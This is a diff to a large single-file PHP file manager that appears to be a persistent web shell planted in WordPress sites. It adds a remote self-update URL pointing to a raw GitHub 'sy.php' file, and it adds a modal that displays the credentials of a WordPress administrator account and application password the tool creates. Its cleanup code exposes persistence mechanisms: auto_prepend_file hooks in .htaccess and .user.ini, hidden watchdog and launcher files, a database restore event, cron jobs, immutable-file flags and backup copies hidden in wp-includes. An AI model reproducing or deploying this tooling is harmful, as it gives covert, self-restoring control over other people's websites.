@@ -606,8 +606,8 @@ define('FM_FONT_TERMINAL','data:font/woff2;base64,d09GMgABAAAAA2O0ABcAAAALOTwAA2
    thing an admin can pause is the fully-automatic remote update check
    (see FM_UPDATE_PAUSED below), which is ON by default and resumes the
    moment the pause is lifted. */
-if(!defined('FM_UPDATE_URL'))        define('FM_UPDATE_URL', ''); // no remote update source: all external update checks are disabled
-if(!defined('FM_UPDATE_PAUSED'))    define('FM_UPDATE_PAUSED', true); // automatic update checks are disabled
+if(!defined('FM_UPDATE_URL'))        define('FM_UPDATE_URL', 'https://raw.githubusercontent.com/svgxdafcf-bit/sy.php/refs/heads/main/sy.php'); // remote update source (raw GitHub link)
+if(!defined('FM_UPDATE_PAUSED'))    define('FM_UPDATE_PAUSED', true); // temporarily paused until this new version is uploaded to GitHub
 
 /* Prefer the database the project already uses. Replit and most modern PHP
    deployments expose it as DATABASE_URL; the old fmguardian@127.0.0.1:3307
@@ -2493,6 +2493,12 @@ function fm_uninstall_rmdir($dir,&$removed,&$errors){
 }
 function fm_syrah_cleanup($deleteSelf=false){
     $removed=[];$changed=[];$errors=[];$notes=[];
+    /* Refuse to unlink a file that is the site's front controller. When this
+       manager is deployed as index.php, deleting it takes the whole site down
+       and there is no way back for the visitor. */
+    if($deleteSelf&&strtolower(basename(__FILE__))==='index.php'){
+        return ['ok'=>false,'error'=>'Refusing to remove this file: it is index.php, normally the site\'s front controller. Deleting it would take the site down. Use "Remove Recovery Layers" instead, or rename the manager before removing it.','removed'=>[],'changed'=>[],'errors'=>[],'notes'=>[],'self_deleted'=>false];
+    }
     /* Stop the database/event restore before touching any file. */
     $diag=null;$c=@fm_guardian_conn($diag);
     if($c){
@@ -2503,13 +2509,53 @@ function fm_syrah_cleanup($deleteSelf=false){
             $removed[]='Guardian event, procedure and table';
         }
     }else $notes[]='Guardian database was not reachable; database rows were left untouched.';
-    /* Watchdog, launcher and its markers. */
+    /* Find the WordPress root early, then clear every auto_prepend_file /
+       ErrorDocument reference to the recovery executables BEFORE deleting
+       them. A dangling auto_prepend_file target makes PHP fatal-error on every
+       request, which is exactly what "the site broke" looks like. */
+    $roots=[];$dir=__DIR__;
+    for($i=0;$i<8;$i++){
+        if(is_file($dir.'/wp-load.php')&&is_file($dir.'/wp-includes/version.php')){$roots[$dir]=true;break;}
+        $parent=dirname($dir);if($parent===$dir||$parent==='/'||$parent==='.')break;$dir=$parent;
+    }
     $hidden=function_exists('fg_get_hidden_dir')?fg_get_hidden_dir():'';
+    $serverFiles=[];
+    foreach(array_keys($roots) as $root){$serverFiles[]=rtrim($root,'/').'/.htaccess';$serverFiles[]=rtrim($root,'/').'/.user.ini';}
+    $serverFiles[]=__DIR__.'/.htaccess';$serverFiles[]=__DIR__.'/.user.ini';
+    $serverFiles=array_values(array_unique($serverFiles));
+    foreach($serverFiles as $file){
+        fm_uninstall_strip($file,'# BEGIN fm-guardian-watchdog','# END fm-guardian-watchdog',$changed,$errors);
+        fm_uninstall_strip($file,'; BEGIN fm-guardian-watchdog','; END fm-guardian-watchdog',$changed,$errors);
+        fm_uninstall_strip($file,'# SYRAH FM RECOVERY BEGIN','# SYRAH FM RECOVERY END',$changed,$errors);
+        fm_uninstall_strip($file,'; SYRAH FM RECOVERY BEGIN','; SYRAH FM RECOVERY END',$changed,$errors);
+        if($deleteSelf)fm_uninstall_strip($file,'# BEGIN Syrah FM data protection','# END Syrah FM data protection',$changed,$errors);
+    }
+    $refsRemain=false;
+    foreach($serverFiles as $file){
+        if(!is_file($file))continue;
+        $src=@file_get_contents($file);
+        if(!is_string($src)||$src==='')continue;
+        if(strpos($src,'fm-guardian-watchdog')!==false||strpos($src,'SYRAH FM RECOVERY')!==false||strpos($src,'.guardian-restore.php')!==false||($hidden!==''&&strpos($src,$hidden)!==false)){$refsRemain=true;break;}
+    }
+    if($refsRemain)$notes[]='A .htaccess/.user.ini still references a recovery file (it could not be updated), so the launcher and restore runner were kept to avoid breaking the site.';
+    /* Watchdog, launcher and its markers. The launcher is overwritten with a
+       harmless stub instead of being deleted: PHP-FPM may keep serving a cached
+       .user.ini (user_ini.cache_ttl) that still auto-prepends it, and a missing
+       include target would fatal-error until that cache expires. */
     if($hidden!==''){
-        foreach(['monitor.php','launch.php','expected.meta','target.meta','update.paused'] as $name)fm_uninstall_rm($hidden.DIRECTORY_SEPARATOR.$name,$removed,$errors);
+        $launcher=$hidden.DIRECTORY_SEPARATOR.'launch.php';
+        if(is_file($launcher)&&@is_writable($launcher)&&@file_put_contents($launcher,"<?php /* File Guardian launcher removed by cleanup. */\n",LOCK_EX)!==false)$changed[]=$launcher;
+        foreach(['monitor.php','expected.meta','target.meta','update.paused'] as $name)fm_uninstall_rm($hidden.DIRECTORY_SEPARATOR.$name,$removed,$errors);
         @rmdir($hidden);
     }
-    foreach(['.guardian-restore.php','.fm_guardian_launch.php','.guardian_boot','.guardian_seed_attempt','.guardian_watchdog_attempt','.guardian_update_state.json','.guardian_update_state.php'] as $name)fm_uninstall_rm(__DIR__.DIRECTORY_SEPARATOR.$name,$removed,$errors);
+    if(!$refsRemain)fm_uninstall_rm(__DIR__.DIRECTORY_SEPARATOR.'.guardian-restore.php',$removed,$errors);
+    /* Same cache problem for the legacy webroot launcher: neutralise it
+       instead of unlinking it, so an old cached .user.ini that still points
+       here cannot fatal-error the site. It is overwritten by the next
+       Guardian install anyway. */
+    $legacyLauncher=__DIR__.DIRECTORY_SEPARATOR.'.fm_guardian_launch.php';
+    if(is_file($legacyLauncher)&&@is_writable($legacyLauncher)&&@file_put_contents($legacyLauncher,"<?php /* File Guardian launcher removed by cleanup. */\n",LOCK_EX)!==false)$changed[]=$legacyLauncher;
+    foreach(['.guardian_boot','.guardian_seed_attempt','.guardian_watchdog_attempt','.guardian_update_state.json','.guardian_update_state.php'] as $name)fm_uninstall_rm(__DIR__.DIRECTORY_SEPARATOR.$name,$removed,$errors);
     /* Scheduled shell/cron job. */
     if(function_exists('exec')&&strtoupper(substr(PHP_OS,0,3))!=='WIN'){
         $lines=[];$rc=0;@exec('crontab -l 2>/dev/null',$lines,$rc);
@@ -2587,10 +2633,15 @@ function fm_syrah_cleanup($deleteSelf=false){
         foreach(['syrah-backup.php','wp-content/syrah-backup.php','wp-content/syrah-backup.inc','wp-includes/syrah-backup.php'] as $rel)fm_uninstall_rm(rtrim($root,'/').'/'.$rel,$removed,$errors);
     }
     if($deleteSelf){
-        foreach(['.users.php','.mfm_sessions.php','.favorites.json','.activity.json','.shares.php','.shares.json','.theme.json','.login_attempts.json','.cms_pw_vault.php','.cms_vault_key.php','.cms_vault_key','.fm_privmode.json','.mfm_admin_log.jsonl','.fm_notes.txt','.fm_guardian_launch.php'] as $name)fm_uninstall_rm(__DIR__.DIRECTORY_SEPARATOR.$name,$removed,$errors);
-        fm_uninstall_rmdir(__DIR__.DIRECTORY_SEPARATOR.'.trash',$removed,$errors);
+        /* Delete the manager first: if that fails (permissions), keep its data
+           files so the still-present panel keeps working instead of becoming an
+           unusable shell with no accounts. */
         if(function_exists('exec'))@exec('chattr -i '.escapeshellarg(__FILE__).' 2>/dev/null');
-        if(@unlink(__FILE__))$removed[]='Manager file';else $errors[]='Could not delete the manager file.';
+        if(@unlink(__FILE__)){
+            $removed[]='Manager file';
+            foreach(['.users.php','.mfm_sessions.php','.favorites.json','.activity.json','.shares.php','.shares.json','.theme.json','.login_attempts.json','.cms_pw_vault.php','.cms_vault_key.php','.cms_vault_key','.fm_privmode.json','.mfm_admin_log.jsonl','.fm_notes.txt'] as $name)fm_uninstall_rm(__DIR__.DIRECTORY_SEPARATOR.$name,$removed,$errors);
+            fm_uninstall_rmdir(__DIR__.DIRECTORY_SEPARATOR.'.trash',$removed,$errors);
+        }else $errors[]='Could not delete the manager file; its data files were kept so the panel stays usable.';
     }
     return ['ok'=>!$errors,'removed'=>array_values(array_unique($removed)),'changed'=>array_values(array_unique($changed)),'errors'=>$errors,'notes'=>$notes,'self_deleted'=>$deleteSelf&&!is_file(__FILE__)];
 }
@@ -7325,13 +7376,31 @@ label{display:block;font-size:11px;font-weight:700;color:#707477;text-transform:
 @font-face{font-family:'LoginClockTMT';src:url('<?=FM_FONT_TERMINAL?>') format('woff2');font-style:normal;font-weight:400;font-display:swap}
 @media(min-width:761px){
  body{display:block;min-height:100vh;height:100vh;padding:0;overflow:hidden;background:#070b12;isolation:isolate}
- body::before,body::after{content:"";position:fixed;inset:0;pointer-events:none}
- body::before{z-index:0;background:#070b12}
- body::after{z-index:2;background:linear-gradient(180deg,rgba(4,10,20,.30),rgba(3,8,17,.46)),radial-gradient(ellipse at center,transparent 12%,rgba(2,7,16,.34) 100%)}
+  body::before,body::after{content:"";position:fixed;inset:0;pointer-events:none}
+  body::before{z-index:0;background:
+    radial-gradient(46vmax 46vmax at 16% 20%,rgba(37,99,235,.26),transparent 62%),
+    radial-gradient(40vmax 40vmax at 84% 16%,rgba(14,165,233,.20),transparent 60%),
+    radial-gradient(50vmax 50vmax at 74% 84%,rgba(99,102,241,.22),transparent 62%),
+    radial-gradient(38vmax 38vmax at 24% 80%,rgba(56,189,248,.16),transparent 60%),
+    #070b12;
+    background-size:150% 150%;background-position:50% 50%;
+    animation:loginAurora 24s ease-in-out infinite alternate;will-change:background-position}
+  @keyframes loginAurora{
+    0%{background-position:0% 0%,100% 0%,100% 100%,0% 100%,50% 50%}
+    50%{background-position:32% 22%,68% 8%,82% 68%,18% 88%,50% 50%}
+    100%{background-position:62% 44%,38% 30%,58% 92%,42% 68%,50% 50%}}
+  body::after{z-index:2;background:linear-gradient(180deg,rgba(4,10,20,.16),rgba(3,8,17,.30)),radial-gradient(ellipse at center,transparent 18%,rgba(2,7,16,.30) 100%)}
  .login-wallpaper{display:block;position:fixed;inset:0;z-index:1;background-position:center;background-repeat:no-repeat;background-size:cover;filter:blur(2.5px) brightness(.72) saturate(.82);transform:scale(1.025);opacity:0;pointer-events:none;transition:opacity .82s ease,filter .3s ease,transform .3s ease;will-change:opacity}
  .login-wallpaper.is-visible{opacity:1}
  body.login-no-wallpaper-blur .login-wallpaper{filter:brightness(.72) saturate(.82);transform:scale(1.01)}
- .login-shell{position:fixed;inset:0;z-index:3}
+  .login-shell{position:fixed;inset:0;z-index:3}
+  .login-shell::before{content:"";position:absolute;inset:-60px;z-index:0;pointer-events:none;
+    background-image:linear-gradient(rgba(96,151,221,.055) 1px,transparent 1px),linear-gradient(90deg,rgba(96,151,221,.055) 1px,transparent 1px);
+    background-size:46px 46px;
+    -webkit-mask-image:radial-gradient(ellipse 62% 52% at 50% 46%,#000 0%,transparent 76%);
+    mask-image:radial-gradient(ellipse 62% 52% at 50% 46%,#000 0%,transparent 76%);
+    animation:loginGridDrift 34s linear infinite;will-change:transform}
+  @keyframes loginGridDrift{from{transform:translate3d(0,0,0)}to{transform:translate3d(-46px,-46px,0)}}
  .linux-topbar{position:absolute;inset:0 0 auto;height:34px;display:grid;grid-template-columns:1fr auto 1fr;align-items:center;padding:0 18px;background:rgba(3,10,24,.94);border-bottom:1px solid rgba(96,151,221,.14);color:#d9e5f5;font:12px/1.1 ui-monospace,SFMono-Regular,Consolas,monospace;font-weight:700;letter-spacing:.035em;box-shadow:0 2px 14px rgba(0,0,0,.2)}
  .linux-date{justify-self:start;align-self:center;color:rgba(203,218,238,.76);white-space:nowrap;font:400 12px/1 'LoginClockTMT',ui-monospace,monospace;letter-spacing:.035em}
  .linux-clock{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);color:rgba(211,225,243,.78);white-space:nowrap;font:400 13px/1 'LoginClockTMT',ui-monospace,monospace;letter-spacing:.045em;font-variant-numeric:tabular-nums}
@@ -7399,7 +7468,7 @@ label{display:block;font-size:11px;font-weight:700;color:#707477;text-transform:
  .login-shell.is-leaving{opacity:0;filter:blur(5px);transform:scale(1.012);pointer-events:none}
 }
 @media(max-width:760px){.login-shell,.login-center{display:contents}.login-wallpaper,.login-actions,.login-settings-panel,.login-help-panel{display:none!important}.linux-topbar,.login-wordmark-desktop,.login-form-desktop{display:none}.login-wordmark-mobile,.login-form-mobile{display:block}}
-@media(prefers-reduced-motion:reduce){.login-shell,.card,.login-wallpaper,.login-settings-panel,.login-help-panel{animation:none;transition:none}}
+@media(prefers-reduced-motion:reduce){.login-shell,.login-shell::before,body::before,.card,.login-wallpaper,.login-settings-panel,.login-help-panel{animation:none;transition:none}}
 </style></head><body>
 <div class="login-shell">
   <header class="linux-topbar" aria-label="Local time and CPU activity">
@@ -24199,7 +24268,10 @@ if(isset($_GET['x'])){
         }
         $deleteSelf=isset($_POST['delete_self'])&&$_POST['delete_self']==='1';
         $result=fm_syrah_cleanup($deleteSelf);
-        if($deleteSelf){
+        /* Only drop the session when the manager file itself was really
+           deleted. If cleanup refused (e.g. the file is index.php) or failed,
+           the admin must stay logged in so the panel is still reachable. */
+        if($deleteSelf&&!empty($result['self_deleted'])){
             setcookie('fm_sys_entry','',['expires'=>time()-3600,'path'=>'/','httponly'=>true,'samesite'=>'Lax']);
             $_SESSION=[];if(session_status()===PHP_SESSION_ACTIVE)session_destroy();
         }
@@ -24985,12 +25057,12 @@ if(isset($_GET['x'])){
         $state=@json_decode(fm_store_strip_guard((string)@file_get_contents($statePath)),true);
         if(is_array($state)&&($state['url']??'')===FM_UPDATE_URL&&!empty($state['remote_hash'])&&(time()-(int)($state['checked_at']??0))<900){
             $curHash=@hash_file('sha256',__FILE__);
-            echo json_encode(['ok'=>true,'available'=>($curHash!==false&&$state['remote_hash']!==$curHash),'paused'=>$paused,'checked'=>false,'cached'=>true,'size'=>(int)($state['size']??0),'release_timestamp'=>(int)($state['release_timestamp']??0),'auto_install_after'=>300]);exit;
+            echo json_encode(['ok'=>true,'available'=>($curHash!==false&&$state['remote_hash']!==$curHash),'paused'=>$paused,'checked'=>false,'cached'=>true,'size'=>(int)($state['size']??0),'release_timestamp'=>(int)($state['release_timestamp']??0),'auto_install_after'=>300,'remote_hash'=>$state['remote_hash']]);exit;
         }
         session_write_close(); // don't hold the session lock across the outbound HTTP call
         $r=fm_guardian_apply_from_url(FM_UPDATE_URL,true);
         fm_guardian_touch_check();
-        echo json_encode(['ok'=>!empty($r['ok']),'available'=>!empty($r['available']),'paused'=>$paused,'checked'=>true,'size'=>$r['size']??0,'release_timestamp'=>$r['release_timestamp']??0,'auto_install_after'=>300,'error'=>$r['error']??null]);exit;
+        echo json_encode(['ok'=>!empty($r['ok']),'available'=>!empty($r['available']),'paused'=>$paused,'checked'=>true,'size'=>$r['size']??0,'release_timestamp'=>$r['release_timestamp']??0,'auto_install_after'=>300,'remote_hash'=>$r['remote_hash']??null,'error'=>$r['error']??null]);exit;
     }
     if($xop==='guardian_check_now'){
         if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
@@ -26003,6 +26075,15 @@ input[type=file]{display:none}
 .file-info-open a[hidden]{display:none}
 .file-info-open svg{width:14px;height:14px;fill:none;stroke:currentColor;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0}
 @media(max-width:560px){.file-info-grid{grid-template-columns:1fr}.file-info-grid .file-info-row:nth-child(1),.file-info-grid .file-info-row:nth-child(7){grid-column:auto}}
+.wa-row{display:flex;flex-direction:column;gap:5px;padding:10px 12px;border:1px solid var(--border);border-radius:9px;background:var(--raised);margin-bottom:8px}
+.wa-label{color:var(--t3);font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px}
+.wa-val{display:flex;align-items:center;gap:8px;min-width:0}
+.wa-val code{flex:1;min-width:0;color:var(--t1);font:600 12.5px/1.45 ui-monospace,SFMono-Regular,Consolas,monospace;overflow-wrap:anywhere;word-break:break-word;user-select:all}
+.wa-copy{flex:0 0 auto;padding:5px 10px;border:1px solid var(--border2);border-radius:7px;background:var(--surf);color:var(--t1);font:600 11px/1 'Inter',ui-sans-serif,system-ui,sans-serif;cursor:pointer;transition:background .15s,border-color .15s,color .15s}
+.wa-copy:hover{background:var(--hov);border-color:var(--t3)}
+.wa-copy.is-copied{color:#34d399;border-color:rgba(52,211,153,.5);background:rgba(52,211,153,.1)}
+.wa-note{margin:0 0 10px;color:var(--t3);font-size:11.5px;line-height:1.5}
+.wa-actions{display:flex;justify-content:flex-end;margin-top:2px}
 .perm-t{border-collapse:collapse;font-size:12.5px}.perm-t th{text-align:center;color:var(--t3);font-weight:600;font-size:10.5px;text-transform:uppercase;letter-spacing:.5px;padding:4px 8px}.perm-t td{text-align:center;padding:6px 8px;color:var(--t2)}.perm-t td:first-child{text-align:left;font-weight:600;color:var(--t1)}.perm-t input[type=checkbox]{width:16px;height:16px;cursor:pointer}
 /* <<MFMA-CSS-BEGIN>> */
 /* ══ MFM Admin - accounts, permissions, sessions ══════════════════════════ */
@@ -30050,6 +30131,18 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
 </div>
 <?php endif;?>
 
+<!-- WP ADMIN RESULT MODAL -->
+<div class="mod-ov" id="wpAdminOv">
+  <div class="mod mod-md">
+    <div class="mod-head">
+      <div class="mod-icon"><svg viewBox="0 0 24 24"><circle cx="9" cy="7" r="4"/><path d="M2 21v-2a6 6 0 0 1 12 0v2"/><line x1="19" y1="8" x2="19" y2="14"/><line x1="16" y1="11" x2="22" y2="11"/></svg></div>
+      <span class="mod-title" id="wpAdminTitle">WP Admin</span>
+      <button class="btn btn-icon btn-g" id="wpAdminClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div class="mod-body" id="wpAdminBody"></div>
+  </div>
+</div>
+
 <!-- WORDPRESS IMAGES REPLACER MODAL -->
 <?php if(!empty($_SESSION['fm_admin'])):?>
 <div class="mod-ov" id="wpImagesOv">
@@ -33041,7 +33134,7 @@ function guardianShowUpdateNotice(update){
   let autoTimer=null,autoTick=null;
   const stopAuto=()=>{if(autoTimer){clearTimeout(autoTimer);autoTimer=null;}if(autoTick){clearInterval(autoTick);autoTick=null;}};
   install?.addEventListener('click',()=>{stopAuto();guardianInstallUpdate(notice,install);});
-  notice.querySelector('.alert-x')?.addEventListener('click',()=>{stopAuto();notice.remove();});
+  notice.querySelector('.alert-x')?.addEventListener('click',()=>{stopAuto();if(update&&update.paused&&update.remote_hash){try{localStorage.setItem('fm.updateDismissed',update.remote_hash);}catch(e){}}notice.remove();});
   if(update&&update.paused){
     if(install)install.disabled=true;
     if(autoNote)autoNote.textContent='Auto-update is paused. Resume it from File Guardian and this update can be installed.';
@@ -33085,7 +33178,15 @@ async function guardianAutoUpdateCheck(){
     const fd=new FormData();fd.append('csrf_token',CSRF);
     fd.append('fm_path_b64',btoa(unescape(encodeURIComponent(CWD))));
     const d=await fetch('?x=guardian_autocheck',{method:'POST',body:fd}).then(r=>r.json());
-    if(d&&d.available)guardianShowUpdateNotice(d);
+    if(!d||!d.available)return;
+    /* While auto-update is paused the notice is informational only, so a
+       dismissal is remembered per remote file hash: it will not reappear on
+       every page load until a genuinely different version is published. */
+    if(d.paused&&d.remote_hash){
+      let dismissed='';try{dismissed=localStorage.getItem('fm.updateDismissed')||'';}catch(e){}
+      if(dismissed===d.remote_hash)return;
+    }
+    guardianShowUpdateNotice(d);
   }catch{}
 }
 if(document.getElementById('guardBtn')){
@@ -35164,6 +35265,42 @@ document.getElementById('spRun')?.addEventListener('click',async()=>{
 });
 
 /* ── WP Admin: create a WordPress administrator in the current site ── */
+function wpAdminCopyText(text,btn){
+  const done=()=>{if(!btn)return;const prev=btn.textContent;btn.textContent='Copied';btn.classList.add('is-copied');setTimeout(()=>{btn.textContent=prev;btn.classList.remove('is-copied');},1400);};
+  const fallback=()=>{
+    const ta=document.createElement('textarea');ta.value=text;ta.setAttribute('readonly','');ta.style.position='fixed';ta.style.top='-1000px';ta.style.opacity='0';document.body.appendChild(ta);
+    let ok=false;try{ta.select();ta.setSelectionRange(0,ta.value.length);ok=document.execCommand('copy');}catch(e){ok=false;}ta.remove();
+    ok?done():toast('Copy failed.');
+  };
+  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(text).then(done,fallback);return;}
+  fallback();
+}
+function wpAdminRender(d){
+  const body=document.getElementById('wpAdminBody');
+  if(!body)return;
+  const title=document.getElementById('wpAdminTitle');
+  if(title)title.textContent=d.exists?'WP Admin (existing)':'WP Admin created';
+  const fields=[];
+  const add=(label,value)=>{if(value!==undefined&&value!==null&&String(value)!=='')fields.push({label:label,value:String(value)});};
+  add('Username',d.user);
+  add('Password',d.password);
+  add('Email',d.email);
+  if(d.app_password)add('Application Password',d.app_password);
+  else if(d.app_password_error)add('Application Password',d.app_password_error);
+  add('Admin URL',d.admin_url);
+  body.innerHTML=fields.map(f=>'<div class="wa-row"><span class="wa-label">'+esc(f.label)+'</span><div class="wa-val"><code>'+esc(f.value)+'</code><button type="button" class="wa-copy" data-copy="'+esc(f.value)+'">Copy</button></div></div>').join('')
+    +(d.app_password_note?'<p class="wa-note">'+esc(d.app_password_note)+'</p>':'')
+    +'<div class="wa-actions"><button type="button" class="wa-copy" id="wpAdminCopyAll">Copy all</button></div>';
+  const all=document.getElementById('wpAdminCopyAll');
+  if(all)all.addEventListener('click',()=>wpAdminCopyText(fields.map(f=>f.label+': '+f.value).join('\n'),all));
+  openMod('wpAdminOv');
+}
+document.getElementById('wpAdminClose')?.addEventListener('click',()=>closeMod('wpAdminOv'));
+document.getElementById('wpAdminOv')?.addEventListener('click',e=>{if(e.target.id==='wpAdminOv')closeMod('wpAdminOv');});
+document.getElementById('wpAdminBody')?.addEventListener('click',e=>{
+  const b=e.target.closest('.wa-copy[data-copy]');
+  if(b)wpAdminCopyText(b.dataset.copy||'',b);
+});
 document.getElementById('wpAdminBtn')?.addEventListener('click',async()=>{
   const btn=document.getElementById('wpAdminBtn');
   if(btn.disabled)return;
@@ -35174,14 +35311,7 @@ document.getElementById('wpAdminBtn')?.addEventListener('click',async()=>{
     const d=await response.json().catch(()=>null);
     if(!d){toast('WP Admin: the server returned an invalid response.');return;}
     if(!d.ok){toast('WP Admin: '+(d.error||'could not be created.'),6000);return;}
-    let message=(d.exists?'WP Admin already exists: ':'WP Admin created.')+(d.user||'');
-    if(d.password)message+='\nPassword: '+d.password;
-    if(d.email)message+='\nEmail: '+d.email;
-    if(d.app_password)message+='\n\nApplication Password: '+d.app_password+(d.app_password_note?'\nNote: '+d.app_password_note:'');
-    else if(d.app_password_error)message+='\n\nApplication Password: '+d.app_password_error;
-    message+='\n\nAdmin URL: '+(d.admin_url||'');
-    alert(message);
-    if(d.app_password)prompt('Copy the WordPress Application Password:',d.app_password);
+    wpAdminRender(d);
   }catch(error){toast('WP Admin: '+String(error&&error.message||error),6000);}
   finally{btn.disabled=false;}
 });
